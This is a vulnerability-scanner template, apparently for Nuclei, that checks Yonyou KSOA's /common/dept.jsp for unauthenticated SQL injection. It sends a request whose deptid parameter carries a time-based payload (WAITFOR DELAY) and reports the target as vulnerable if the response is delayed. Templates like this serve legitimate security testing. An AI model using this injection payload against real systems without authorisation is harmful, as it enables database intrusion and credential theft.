id: yonyou-ksoa-dept-depid-sqli
info:
  name: yonyou-ksoa-dept-sqli
  author: apple
  severity: high
  description: 用友时空KSOA /common/dept.jsp处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
  reference:
    - https://mp.weixin.qq.com/s/AxD3XXrBAcGMID_z5_6X7w
  tags: yonyou
http:
  - raw:
      - |-
        GET /common/dept.jsp?deptid=1%27%20WAITFOR%20DELAY%20'0:0:5'--%20LTLq HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate
        Connection: close
        Cookie: JSESSIONID=E58971F0EAAF44FC20D0
        Upgrade-Insecure-Requests: 1
    matchers:
      - type: dsl
        dsl:
          - 'duration>=5'
          - 'status_code == 200'
        condition: and
